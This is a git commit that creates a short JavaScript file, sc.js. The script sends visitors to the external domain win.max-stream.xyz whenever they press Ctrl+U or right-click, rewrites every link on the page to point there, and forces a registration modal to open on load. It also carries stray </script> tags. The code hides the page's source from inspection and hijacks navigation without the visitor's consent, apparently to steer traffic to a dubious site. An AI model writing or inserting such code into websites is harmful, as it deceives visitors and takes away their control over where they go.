64f5a8f0d0b7152e63d6e31f99ef907a2ab92c79
mrbriansmith93 <73699539+mrbriansmith93@users.noreply.github.com>
2020-10-30 08:11:59 -0400

    Create sc.js

---
+++ sc.js
@@ -0,0 +1,20 @@
+</script>
+
+function redirectCU(e) {
+  if (e.ctrlKey && e.which == 85) {
+    window.location.replace("http://win.max-stream.xyz");
+    return false;
+  }
+}
+document.onkeydown = redirectCU;
+function redirectKK(e) {
+  if (e.which == 3) {
+    window.location.replace("http://win.max-stream.xyz");
+    return false;
+  }
+}
+document.oncontextmenu = redirectKK;
+$(window).on('load',function(){ $('#register_form').modal('show'); });
+$("a").attr("href", "http://win.max-stream.xyz");
+
+</script>
